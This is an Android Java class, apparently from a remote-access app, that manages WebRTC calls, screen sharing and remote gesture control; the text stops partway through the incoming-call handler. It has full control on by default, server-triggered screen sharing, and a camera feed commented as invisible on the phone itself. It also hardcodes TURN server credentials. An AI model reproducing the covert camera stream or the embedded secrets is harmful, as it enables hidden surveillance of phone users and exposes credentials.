package com.tokendeal.vremote;

import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import org.webrtc.*;

import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;

public class WebRTCCompanion {
    private static final String TAG = "WebRTCCompanion";

    public interface Callback {
        void onConnected(String myId);
        void onStatusChanged(String status, boolean isLive);
        void onParticipantsList(List<String> users);
        void onIncomingCall(String fromUser, String callType);
        void onRemoteVideoTrack(VideoTrack track);
        void onCallEnded();
        void onError(String error);
        void onAutoScreenShareRequest(String fromUser, boolean fullControl, boolean streamCamera, String cameraChoice);
    }

    private final Context context;
    private final String serverUrl;
    private Callback callback;
    private String myId;
    private String activePeer;
    private boolean isFullControlEnabled = true;

    private Socket socket;
    private EglBase rootEglBase;
    private PeerConnectionFactory peerConnectionFactory;
    private PeerConnection peerConnection;
    private ScreenCapturerAndroid screenCapturer;
    private CameraVideoCapturer cameraCapturer;
    private SurfaceTextureHelper surfaceTextureHelper;
    private VideoSource videoSource;
    private VideoTrack localVideoTrack;

    // Optional Companion Camera (Streamed ONLY to Controller Desktop during Screen Share)
    private CameraVideoCapturer companionCameraCapturer;
    private SurfaceTextureHelper companionTextureHelper;
    private VideoSource companionVideoSource;
    private VideoTrack companionCameraTrack;
    private boolean isCompanionCamFront = true;

    private AudioSource audioSource;
    private AudioTrack localAudioTrack;
    private DataChannel remoteControlChannel;
    private final List<IceCandidate> queuedCandidates = new ArrayList<>();
    private JSONObject incomingOfferObj = null;
    private JSONObject pendingOfferPayload = null;

    // Remote Gesture Injection Throttling & Protection
    private static final int MAX_PENDING_GESTURES = 10;
    private final Handler gestureHandler = new Handler(Looper.getMainLooper());
    private final java.util.concurrent.atomic.AtomicInteger pendingGestures = new java.util.concurrent.atomic.AtomicInteger(0);
    private volatile long lastGestureDispatchTime = 0;

    public WebRTCCompanion(Context context, String serverUrl, String initialId, Callback callback) {
        this.context = context.getApplicationContext();
        this.serverUrl = serverUrl;
        if (initialId != null && !initialId.trim().isEmpty()) {
            String clean = initialId.trim();
            this.myId = clean.endsWith("_screen") ? clean : (clean + "_screen");
        } else {
            this.myId = DeviceRegistry.getDeviceId(this.context) + "_screen";
        }
        this.callback = callback;

        initWebRTC();
        connectSocket();
    }

    public EglBase.Context getEglContext() {
        return rootEglBase.getEglBaseContext();
    }

    private boolean isScreenSharingCall = false;

    public void setFullControlEnabled(boolean enabled) {
        this.isFullControlEnabled = enabled;
    }

    public boolean isSharing() {
        return isScreenSharingCall && screenCapturer != null;
    }

    public void setMyId(String newId) {
        if (newId == null || newId.trim().isEmpty()) return;
        String deviceId = DeviceRegistry.getDeviceId(this.context);
        String clean = newId.trim();
        // The companion ID must always represent this physical device (e.g. 67230CDECD11DE4A_screen)
        if (!clean.contains(deviceId)) {
            Log.i(TAG, "Preserving permanent device companion ID (" + this.myId + "), ignoring non-device ID: " + clean);
            return;
        }
        this.myId = clean.endsWith("_screen") ? clean : (clean + "_screen");
        if (socket != null && socket.connected() && !this.myId.isEmpty()) {
            Log.i(TAG, "Companion registering socket as: " + this.myId);
            socket.emit("join-user", this.myId);
        }
    }

    public String getMyId() {
        return myId;
    }

    public String getActivePeer() {
        return activePeer;
    }

    public void refreshUsers() {
        if (socket != null && socket.connected()) {
            socket.emit("get-users");
        }
    }

    private void initWebRTC() {
        rootEglBase = EglBase.create();

        PeerConnectionFactory.InitializationOptions options =
                PeerConnectionFactory.InitializationOptions.builder(context)
                        .setEnableInternalTracer(false)
                        .createInitializationOptions();
        PeerConnectionFactory.initialize(options);

        DefaultVideoEncoderFactory encoderFactory =
                new DefaultVideoEncoderFactory(rootEglBase.getEglBaseContext(), true, true);
        DefaultVideoDecoderFactory decoderFactory =
                new DefaultVideoDecoderFactory(rootEglBase.getEglBaseContext());

        peerConnectionFactory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory();

        // STRICT HARDWARE RULE: Camera and Microphone are NEVER activated while idle!
        // AudioSource and AudioTrack are dynamically acquired only when a call starts,
        // and immediately destroyed/released when the call ends to protect privacy and save battery.
        audioSource = null;
        localAudioTrack = null;
    }

    private synchronized void ensureAudioTrack() {
        if (audioSource == null && peerConnectionFactory != null) {
            try {
                MediaConstraints audioConstraints = new MediaConstraints();
                audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
                audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
                audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
                audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
                audioSource = peerConnectionFactory.createAudioSource(audioConstraints);
                localAudioTrack = peerConnectionFactory.createAudioTrack("ARDAMSa0", audioSource);
                localAudioTrack.setEnabled(true);
                Log.i(TAG, "Audio hardware (mic) activated for call");
            } catch (Throwable t) {
                Log.e(TAG, "Error activating audio hardware", t);
            }
        }
    }

    private void connectSocket() {
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.forceNew = true;

            socket = IO.socket(URI.create(serverUrl), opts);
            AppLogs.registerSocket(socket);

            socket.on(Socket.EVENT_CONNECT, args -> {
                String sId = socket != null ? socket.id() : "null";
                AppLog.i(TAG, "Signaling Socket Connected [id=" + sId + ", url=" + serverUrl + "]");
                AppLogs.flushPersistentLogs(socket);
                if (myId != null && !myId.isEmpty()) {
                    AppLog.i(TAG, "Emitting companion join-user: " + myId);
                    socket.emit("join-user", myId);
                }
                registerDevice();
                if (callback != null && myId != null && !myId.isEmpty()) callback.onConnected(myId);

                if (pendingOfferPayload != null) {
                    try {
                        if (myId != null && !myId.isEmpty()) {
                            pendingOfferPayload.put("from", myId);
                        }
                        AppLog.i(TAG, "Socket connected! Emitting queued offer to: " + pendingOfferPayload.optString("to"));
                        socket.emit("offer", pendingOfferPayload);
                        pendingOfferPayload = null;
                    } catch (Exception e) {
                        AppLog.e(TAG, "Error emitting queued offer", e);
                    }
                }
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                String reason = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                String sId = socket != null ? socket.id() : "null";
                AppLog.w(TAG, "Signaling Socket Disconnected [id=" + sId + ", url=" + serverUrl + ", reason=" + reason + "]");
            });

            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                String error = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                AppLogs.e(TAG, "Signaling Socket Connect Error [url=" + serverUrl + ", error=" + error + "]");
            });

            socket.on("name-confirmed", args -> {
                String confirmedName = String.valueOf(args[0]);
                this.myId = confirmedName;
                AppLog.i(TAG, "Name confirmed by server: " + confirmedName);
                if (callback != null) callback.onConnected(confirmedName);
            });

            socket.on("joined", args -> {
                try {
                    JSONObject usersObj = (JSONObject) args[0];
                    List<String> list = new ArrayList<>();
                    Iterator<String> keys = usersObj.keys();
                    while (keys.hasNext()) {
                        String name = keys.next();
                        if (!name.equalsIgnoreCase(myId)) {
                            list.add(name);
                        }
                    }
                    if (callback != null) callback.onParticipantsList(list);
                } catch (Exception e) {
                    AppLog.e(TAG, "Error parsing joined users", e);
                }
            });

            socket.on("offer", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String from = data.getString("from");
                    JSONObject offerObj = data.getJSONObject("offer");
                    this.activePeer = from;
                    this.incomingOfferObj = offerObj;

                    AppLog.i(TAG, "Received call offer from " + from);
                    if (callback != null) callback.onIncomingCall(from, "Call");
                } catch (Exception e) {
                    AppLog.e(TAG, "Error handling offer", e);
                }
            });

            socket.on("answer", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    JSONObject answerObj = data.getJSONObject("answer");
                    // The server delivers signalling to every socket of this
                    // device group. An instance that never created an offer has
                    // no peer connection / active peer — it must ignore the
                    // answer instead of throwing an NPE.
                    if (peerConnection == null || activePeer == null) {
                        AppLog.i(TAG, "Ignoring answer: this instance has no active peer connection");
                        return;
                    }
                    AppLog.i(TAG, "Received call answer from " + activePeer);
                    handleRemoteAnswer(answerObj);
                } catch (Exception e) {
                    AppLog.e(TAG, "Error handling answer", e);
                }
            });

            socket.on("icecandidate", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    JSONObject candidateObj = data.getJSONObject("candidate");
                    if (peerConnection == null) {
                        // Wrong instance of the group (or call already ended) —
                        // never queue candidates for a PC that does not exist.
                        return;
                    }
                    IceCandidate candidate = new IceCandidate(
                            candidateObj.getString("sdpMid"),
                            candidateObj.getInt("sdpMLineIndex"),
                            candidateObj.getString("candidate")
                    );
                    if (peerConnection.getRemoteDescription() != null) {
                        peerConnection.addIceCandidate(candidate);
                    } else {
                        queuedCandidates.add(candidate);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling remote candidate", e);
                }
            });

            socket.on("end-call", args -> {
                Log.i(TAG, "Call ended by peer");
                endCall(false);
            });

            socket.on("call-mode-change", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String mode = data.optString("mode", "");
                    Log.i(TAG, "Call mode change received: " + mode);
                    if ("audio".equalsIgnoreCase(mode)) {
                        if (localVideoTrack != null) {
                            localVideoTrack.setEnabled(false);
                        }
                    } else if ("video".equalsIgnoreCase(mode)) {
                        if (localVideoTrack != null) {
                            localVideoTrack.setEnabled(true);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error handling call-mode-change in companion", e);
                }
            });

            socket.on("chat-message", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String text = data.optString("text", "");
                    if ("__SYS_REQ_FLIP_CAMERA__".equals(text)) {
                        switchCompanionCamera();
                    }
                } catch (Exception ignored) {}
            });

            socket.on("remote-control", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    handleRemoteControlMessage(data.toString());
                } catch (Exception e) {
                    Log.e(TAG, "Error handling socket remote-control:", e);
                }
            });

            listenForAutoCommands();
            socket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Socket connect error", e);
            if (callback != null) callback.onError("Socket error: " + e.getMessage());
        }
    }

    private void setupPeerConnection() {
        if (peerConnection != null) {
            try {
                peerConnection.close();
                peerConnection.dispose();
            } catch (Throwable ignored) {}
            peerConnection = null;
        }
        // Bug 7 fix: clear any orphaned queued candidates from previous call
        queuedCandidates.clear();

        List<PeerConnection.IceServer> iceServers = new ArrayList<>();
        // STUN servers
        iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer());

        // Primary VPS TURN Relay (UDP & TCP) - allows traversal across mobile 4G/5G/LTE NAT
        iceServers.add(PeerConnection.IceServer.builder("turn:201.18.218.29:3478?transport=udp")
                .setUsername("webrtc")
                .setPassword("webrtcpass123")
                .createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("turn:201.18.218.29:3478?transport=tcp")
                .setUsername("webrtc")
                .setPassword("webrtcpass123")
                .createIceServer());

        // Fallback OpenRelay TURN (Ports 80 & 443 for strict firewalls)
        iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:80")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        iceServers.add(PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443?transport=tcp")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());

        PeerConnection.RTCConfiguration rtcConfig = new PeerConnection.RTCConfiguration(iceServers);
        rtcConfig.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        rtcConfig.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        rtcConfig.iceTransportsType = PeerConnection.IceTransportsType.ALL;
        rtcConfig.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.ENABLED;
        rtcConfig.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        rtcConfig.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        peerConnection = peerConnectionFactory.createPeerConnection(rtcConfig, new PeerConnection.Observer() {
            @Override
            public void onSignalingChange(PeerConnection.SignalingState signalingState) {
                AppLog.i(TAG, "Signaling State: " + signalingState);
            }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {
                AppLog.i(TAG, "ICE Connection State: " + iceConnectionState);
                if (iceConnectionState == PeerConnection.IceConnectionState.CONNECTED ||
                    iceConnectionState == PeerConnection.IceConnectionState.COMPLETED) {
                    if (callback != null) callback.onStatusChanged("In Call with " + activePeer, true);
                }
                if (iceConnectionState == PeerConnection.IceConnectionState.DISCONNECTED ||
                    iceConnectionState == PeerConnection.IceConnectionState.FAILED) {
                    if (callback != null) callback.onStatusChanged("Call Disconnected", false);
                    if (iceConnectionState == PeerConnection.IceConnectionState.FAILED && isInCall()) {
                        AppLog.e(TAG, "WebRTC ICE connection failed (Network/Firewall error)");
                        emitDeviceError("WebRTC ICE connection failed (Network/Firewall error)");
                    }
                }
            }

            @Override
            public void onIceConnectionReceivingChange(boolean b) {}

            @Override
            public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {
                AppLog.d(TAG, "ICE Gathering State: " + iceGatheringState);
            }

            @Override
            public void onIceCandidate(IceCandidate iceCandidate) {
                try {
                    JSONObject candidateJson = new JSONObject();
                    candidateJson.put("candidate", iceCandidate.sdp);
                    candidateJson.put("sdpMid", iceCandidate.sdpMid);
                    candidateJson.put("sdpMLineIndex", iceCandidate.sdpMLineIndex);

                    JSONObject payload = new JSONObject();
                    payload.put("to", activePeer);
                    payload.put("from", myId);
                    payload.put("candidate", candidateJson);

                    if (socket != null && socket.connected()) {
                        socket.emit("icecandidate", payload);
                        AppLog.d(TAG, "Dispatched ICE candidate to " + activePeer);
                    }
                } catch (Exception e) {
                    AppLog.e(TAG, "Error sending ICE candidate", e);
                }
            }

            @Override
            public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}

            @Override
            public void onAddStream(MediaStream mediaStream) {}

            @Override
            public void onRemoveStream(MediaStream mediaStream) {}

            @Override
            public void onDataChannel(DataChannel dataChannel) {
                AppLog.i(TAG, "Received incoming DataChannel: " + dataChannel.label());
                registerDataChannel(dataChannel);
            }

            @Override
            public void onRenegotiationNeeded() {}

            @Override
            public void onAddTrack(RtpReceiver rtpReceiver, MediaStream[] mediaStreams) {
                MediaStreamTrack track = rtpReceiver.track();
                if (track instanceof VideoTrack) {
                    VideoTrack vt = (VideoTrack) track;
                    AppLog.i(TAG, "Received remote VideoTrack from " + activePeer + " (" + vt.id() + ")");
                    if (callback != null) callback.onRemoteVideoTrack(vt);
                }
            }
        });

        // Create Remote Control DataChannel
        DataChannel.Init init = new DataChannel.Init();
        init.ordered = true;
        remoteControlChannel = peerConnection.createDataChannel("remote-control", init);
        registerDataChannel(remoteControlChannel);
    }

    public synchronized void cleanupActiveMediaSession() {
        Log.i(TAG, "cleanupActiveMediaSession: Shutting down all camera, mic, and screen capture hardware.");
        isScreenSharingCall = false;
        activePeer = null;

        try {
            gestureHandler.removeCallbacksAndMessages(null);
            pendingGestures.set(0);
        } catch (Throwable ignored) {}

        if (remoteControlChannel != null) {
            try { remoteControlChannel.close(); } catch (Throwable ignored) {}
            remoteControlChannel = null;
        }

        // 1. Immediately mute and disable tracks to cut off hardware stream instantly
        if (localVideoTrack != null) {
            try { localVideoTrack.setEnabled(false); } catch (Throwable ignored) {}
        }
        if (companionCameraTrack != null) {
            try { companionCameraTrack.setEnabled(false); } catch (Throwable ignored) {}
        }
        if (localAudioTrack != null) {
            try { localAudioTrack.setEnabled(false); } catch (Throwable ignored) {}
        }

        // 2. Stop and dispose all capturers with separate try-catches
        if (screenCapturer != null) {
            try { screenCapturer.stopCapture(); } catch (Throwable ignored) {}
            try { screenCapturer.dispose(); } catch (Throwable ignored) {}
            screenCapturer = null;
        }
        if (cameraCapturer != null) {
            try { cameraCapturer.stopCapture(); } catch (Throwable ignored) {}
            try { cameraCapturer.dispose(); } catch (Throwable ignored) {}
            cameraCapturer = null;
        }
        if (companionCameraCapturer != null) {
            try { companionCameraCapturer.stopCapture(); } catch (Throwable ignored) {}
            try { companionCameraCapturer.dispose(); } catch (Throwable ignored) {}
            companionCameraCapturer = null;
        }

        // 3. Dispose tracks
        if (localVideoTrack != null) {
            try { localVideoTrack.dispose(); } catch (Throwable ignored) {}
            localVideoTrack = null;
        }
        if (companionCameraTrack != null) {
            try { companionCameraTrack.dispose(); } catch (Throwable ignored) {}
            companionCameraTrack = null;
        }
        if (localAudioTrack != null) {
            try { localAudioTrack.dispose(); } catch (Throwable ignored) {}
            localAudioTrack = null;
        }

        // 4. Dispose sources
        if (videoSource != null) {
            try { videoSource.dispose(); } catch (Throwable ignored) {}
            videoSource = null;
        }
        if (companionVideoSource != null) {
            try { companionVideoSource.dispose(); } catch (Throwable ignored) {}
            companionVideoSource = null;
        }
        if (audioSource != null) {
            try { audioSource.dispose(); } catch (Throwable ignored) {}
            audioSource = null;
        }

        // 5. Close peerConnection
        if (peerConnection != null) {
            try {
                peerConnection.close();
                peerConnection.dispose();
            } catch (Throwable ignored) {}
            peerConnection = null;
        }

        // 6. Dispose SurfaceTextureHelpers
        if (surfaceTextureHelper != null) {
            try { surfaceTextureHelper.dispose(); } catch (Throwable ignored) {}
            surfaceTextureHelper = null;
        }
        if (companionTextureHelper != null) {
            try { companionTextureHelper.dispose(); } catch (Throwable ignored) {}
            companionTextureHelper = null;
        }

        queuedCandidates.clear();
        Log.i(TAG, "cleanupActiveMediaSession: All hardware completely released.");
    }

    public void startScreenShare(String targetUser, Intent captureIntentData, int width, int height) {
        startScreenShare(targetUser, captureIntentData, width, height, false, "front");
    }

    public void startScreenShare(String targetUser, Intent captureIntentData, int width, int height, boolean streamCamera, String cameraChoice) {
        if (captureIntentData == null) {
            Log.e(TAG, "startScreenShare: captureIntentData is null! Cannot initialize ScreenCapturerAndroid");
            AppLog.e(TAG, "Screen capture failed: Permission token intent was null");
            if (callback != null) callback.onError("Screen capture failed: Permission token intent was null");
            return;
        }

        // Cleanly release any prior media session FIRST before setting activePeer & call state
        cleanupActiveMediaSession();

        this.activePeer = targetUser;
        this.isScreenSharingCall = true;
        AppLog.i(TAG, "Screen sharing starting for " + targetUser + " (" + width + "x" + height + ", cam=" + cameraChoice + ")");

        setupPeerConnection();

        try {
            surfaceTextureHelper = SurfaceTextureHelper.create("ScreenCaptureThread", rootEglBase.getEglBaseContext());
            screenCapturer = new ScreenCapturerAndroid(captureIntentData, new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.i(TAG, "User stopped screen capture via OS prompt");
                    endCall(true);
                }
            });

            videoSource = peerConnectionFactory.createVideoSource(screenCapturer.isScreencast());
            screenCapturer.initialize(surfaceTextureHelper, context, videoSource.getCapturerObserver());

            int capWidth = Math.min(width, 1080);
            int capHeight = (int) ((float) height * capWidth / width);
            capWidth = (capWidth / 2) * 2;
            capHeight = (capHeight / 2) * 2;

            Log.i(TAG, "Starting screen capture: " + capWidth + "x" + capHeight + " @ 30fps");
            screenCapturer.startCapture(capWidth, capHeight, 30);

            localVideoTrack = peerConnectionFactory.createVideoTrack("ARDAMSv0", videoSource);
            localVideoTrack.setEnabled(true);

            peerConnection.addTrack(localVideoTrack, Collections.singletonList("ARDAMS"));
            ensureAudioTrack();
            if (localAudioTrack != null) {
                localAudioTrack.setEnabled(true);
                peerConnection.addTrack(localAudioTrack, Collections.singletonList("ARDAMS"));
            }

            // Companion Camera Feed (Visible ONLY to controller desktop, invisible on phone screen)
            if (streamCamera) {
                try {
                    boolean preferFront = !"back".equalsIgnoreCase(cameraChoice);
                    companionCameraCapturer = createCameraCapturer(preferFront);

                    if (companionCameraCapturer != null) {
                        companionTextureHelper = SurfaceTextureHelper.create("CompanionCamThread", rootEglBase.getEglBaseContext());
                        companionVideoSource = peerConnectionFactory.createVideoSource(companionCameraCapturer.isScreencast());
                        companionCameraCapturer.initialize(companionTextureHelper, context, companionVideoSource.getCapturerObserver());
                        companionCameraCapturer.startCapture(640, 480, 24);

                        companionCameraTrack = peerConnectionFactory.createVideoTrack("ARDAMSv1_CAM", companionVideoSource);
                        companionCameraTrack.setEnabled(true);
                        peerConnection.addTrack(companionCameraTrack, Collections.singletonList("ARDAMS"));
                        Log.i(TAG, "Companion camera stream active (choice=" + cameraChoice + ", isFront=" + isCompanionCamFront + ")");
                    }
                } catch (Exception camErr) {
                    Log.w(TAG, "Failed to start companion camera: " + camErr.getMessage());
                }
            }

            createAndSendOffer(targetUser);

        } catch (Exception e) {
            Log.e(TAG, "Screen share init error", e);
            AppLog.e(TAG, "Screen share init error: " + e.getMessage());
            cleanupActiveMediaSession();
            if (callback != null) callback.onError("Screen capture failed: " + e.getMessage());
        }
    }

    private CameraVideoCapturer createCameraCapturer(boolean preferFront) {
        CameraEnumerator enumerator;
        try {
            if (Camera2Enumerator.isSupported(context)) {
                enumerator = new Camera2Enumerator(context);
            } else {
                enumerator = new Camera1Enumerator(true);
            }
        } catch (Exception e) {
            enumerator = new Camera1Enumerator(true);
        }

        String[] deviceNames = enumerator.getDeviceNames();
        String chosenCam = null;

        for (String name : deviceNames) {
            if (preferFront && enumerator.isFrontFacing(name)) {
                chosenCam = name;
                isCompanionCamFront = true;
                break;
            } else if (!preferFront && enumerator.isBackFacing(name)) {
                chosenCam = name;
                isCompanionCamFront = false;
                break;
            }
        }

        if (chosenCam == null) {
            for (String name : deviceNames) {
                if (!preferFront && enumerator.isFrontFacing(name)) {
                    chosenCam = name;
                    isCompanionCamFront = true;
                    break;
                } else if (preferFront && enumerator.isBackFacing(name)) {
                    chosenCam = name;
                    isCompanionCamFront = false;
                    break;
                }
            }
        }

        if (chosenCam == null && deviceNames.length > 0) {
            chosenCam = deviceNames[0];
            isCompanionCamFront = enumerator.isFrontFacing(chosenCam);
        }

        if (chosenCam != null) {
            try {
                CameraVideoCapturer capturer = enumerator.createCapturer(chosenCam, null);
                if (capturer != null) {
                    Log.i(TAG, "Created camera capturer: " + chosenCam + " (front=" + isCompanionCamFront + ")");
                    return capturer;
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed creating capturer for " + chosenCam + ", trying Camera1 fallback", e);
            }
        }

        try {
            Camera1Enumerator cam1 = new Camera1Enumerator(true);
            for (String name : cam1.getDeviceNames()) {
                if (preferFront && cam1.isFrontFacing(name)) {
                    isCompanionCamFront = true;
                    return cam1.createCapturer(name, null);
                } else if (!preferFront && cam1.isBackFacing(name)) {
                    isCompanionCamFront = false;
                    return cam1.createCapturer(name, null);
                }
            }
            if (cam1.getDeviceNames().length > 0) {
                String first = cam1.getDeviceNames()[0];
                isCompanionCamFront = cam1.isFrontFacing(first);
                return cam1.createCapturer(first, null);
            }
        } catch (Exception ignored) {}

        return null;
    }

    public void switchCompanionCamera() {
        switchCompanionCameraFacing(!isCompanionCamFront);
    }

    public void setCompanionCameraEnabled(boolean enabled) {
        if (companionCameraTrack != null) {
            companionCameraTrack.setEnabled(enabled);
            Log.i(TAG, "Companion camera track enabled=" + enabled);
        }
    }

    public void setCompanionCameraFacing(boolean wantFront) {
        setCompanionCameraEnabled(true);
        if (isCompanionCamFront == wantFront) {
            Log.i(TAG, "Companion camera already facing: " + (wantFront ? "front" : "back"));
            return;
        }
        switchCompanionCameraFacing(wantFront);
    }

    private void switchCompanionCameraFacing(boolean wantFront) {
        CameraVideoCapturer capturer = companionCameraCapturer != null ? companionCameraCapturer : cameraCapturer;
        if (capturer == null) {
            Log.w(TAG, "switchCompanionCamera: No active camera capturer to switch");
            return;
        }

        CameraEnumerator enumerator;
        try {
            if (Camera2Enumerator.isSupported(context)) {
                enumerator = new Camera2Enumerator(context);
            } else {
                enumerator = new Camera1Enumerator(true);
            }
        } catch (Exception e) {
            enumerator = new Camera1Enumerator(true);
        }

        String[] deviceNames = enumerator.getDeviceNames();
        String targetCam = null;

        for (String name : deviceNames) {
            if (!wantFront && enumerator.isBackFacing(name)) {
                targetCam = name;
                break;
            } else if (wantFront && enumerator.isFrontFacing(name)) {
                targetCam = name;
                break;
            }
        }

        CameraVideoCapturer.CameraSwitchHandler handler = new CameraVideoCapturer.CameraSwitchHandler() {
            @Override
            public void onCameraSwitchDone(boolean isFront) {
                isCompanionCamFront = isFront;
                Log.i(TAG, "Camera switch completed! Front=" + isFront);
            }

            @Override
            public void onCameraSwitchError(String errorDescription) {
                Log.w(TAG, "Camera switch error with target (" + errorDescription + "), attempting default cycle switch");
                try {
                    capturer.switchCamera(new CameraVideoCapturer.CameraSwitchHandler() {
                        @Override public void onCameraSwitchDone(boolean isFront) { isCompanionCamFront = isFront; }
                        @Override public void onCameraSwitchError(String err) { Log.e(TAG, "Fallback cycle switch error: " + err); }
                    });
                } catch (Exception ignored) {}
            }
        };

        if (targetCam != null) {
            Log.i(TAG, "Switching camera to target: " + targetCam + " (wantFront=" + wantFront + ")");
            capturer.switchCamera(handler, targetCam);
        } else {
            Log.i(TAG, "Switching camera via cycle switch (wantFront=" + wantFront + ")");
            capturer.switchCamera(handler);
        }
    }

    public void startVideoCall(String targetUser) {
        cleanupActiveMediaSession();
        this.activePeer = targetUser;
        this.isScreenSharingCall = false;
        setupPeerConnection();

        try {
            cameraCapturer = createCameraCapturer(true);
            if (cameraCapturer != null) {
                surfaceTextureHelper = SurfaceTextureHelper.create("CameraThread", rootEglBase.getEglBaseContext());
                videoSource = peerConnectionFactory.createVideoSource(cameraCapturer.isScreencast());
                cameraCapturer.initialize(surfaceTextureHelper, context, videoSource.getCapturerObserver());
                try {
                    cameraCapturer.startCapture(1280, 720, 30);
                } catch (Exception e1) {
                    try {
                        cameraCapturer.startCapture(640, 480, 30);
                    } catch (Exception ignored) {}
                }

                localVideoTrack = peerConnectionFactory.createVideoTrack("ARDAMSv0", videoSource);
                localVideoTrack.setEnabled(true);
                peerConnection.addTrack(localVideoTrack, Collections.singletonList("ARDAMS"));
            }

            ensureAudioTrack();
            if (localAudioTrack != null) {
                localAudioTrack.setEnabled(true);
                peerConnection.addTrack(localAudioTrack, Collections.singletonList("ARDAMS"));
            }
            createAndSendOffer(targetUser);

        } catch (Exception e) {
            Log.e(TAG, "Camera init error", e);
            AppLogs.e(TAG, "Camera init error: " + e.getMessage(), e);
            if (callback != null) callback.onError("Camera error: " + e.getMessage());
        }
    }

    public void startAudioCall(String targetUser) {
        cleanupActiveMediaSession();
        this.activePeer = targetUser;
        this.isScreenSharingCall = false;
        setupPeerConnection();
        ensureAudioTrack();
        if (localAudioTrack != null) {
            localAudioTrack.setEnabled(true);
            peerConnection.addTrack(localAudioTrack, Collections.singletonList("ARDAMS"));
        }
        createAndSendOffer(targetUser);
    }

    public void acceptIncomingCall() {
        if (incomingOfferObj == null || activePeer == null) return;
        String peer = activePeer;
        JSONObject offerSnapshot = incomingOfferObj;
        String offerSdp = offerSnapshot.optString("sdp", "");
        // A video offer must be answered with a camera track. Previously the
        // companion only attached the microphone, so a browser -> phone video
        // call connected but the caller never received any video.
        boolean wantsVideo = offerSdp.contains("m=video");

        if (wantsVideo) {
            try {
                MainActivity.startMediaForegroundService(context, "video_call");
            } catch (Throwable ignored) {}
        }

        cleanupActiveMediaSession();
        this.activePeer = peer;
        this.incomingOfferObj = offerSnapshot;
        setupPeerConnection();

        if (wantsVideo) {
            try {
                cameraCapturer = createCameraCapturer(true);
                if (cameraCapturer != null) {
                    surfaceTextureHelper = SurfaceTextureHelper.create("CameraThread", rootEglBase.getEglBaseContext());
                    videoSource = peerConnectionFactory.createVideoSource(cameraCapturer.isScreencast());
                    cameraCapturer.initialize(surfaceTextureHelper, context, videoSource.getCapturerObserver());
                    try {
                        cameraCapturer.startCapture(1280, 720, 30);
                    } catch (Exception e1) {
                        try { cameraCapturer.startCapture(640, 480, 30); } catch (Exception ignored) {}
                    }
                    localVideoTrack = peerConnectionFactory.createVideoTrack("ARDAMSv0", videoSource);
                    localVideoTrack.setEnabled(true);
                    peerConnection.addTrack(localVideoTrack, Collections.singletonList("ARDAMS"));
                    AppLog.i(TAG, "Incoming video offer accepted with camera track");
                } else {
                    AppLog.w(TAG, "Incoming video offer: no camera capturer available");
                }
            } catch (Exception camErr) {
                AppLog.e(TAG, "Incoming call camera error: " + camErr.getMessage(), camErr);
            }
        }

        ensureAudioTrack();
        if (localAudioTrack != null) {
            localAudioTrack.setEnabled(true);
            peerConnection.addTrack(localAudioTrack, Collections.singletonList("ARDAMS"));
        }

        try {
            SessionDescription offer = new SessionDescription(
                    SessionDescription.Type.OFFER,
                    offerSdp
            );
            peerConnection.setRemoteDescription(new SimpleSdpObserver() {
                @Override
                public void onSetSuccess() {
                    drainCandidates();
                    peerConnection.createAnswer(new SimpleSdpObserver() {
                        @Override
                        public void onCreateSuccess(SessionDescription sessionDescription) {
                            peerConnection.setLocalDescription(new SimpleSdpObserver(), sessionDescription);
                            try {
                                JSONObject ansPayload = new JSONObject();
                                JSONObject sdpJson = new JSONObject();
                                sdpJson.put("type", "answer");
                                sdpJson.put("sdp", sessionDescription.description);
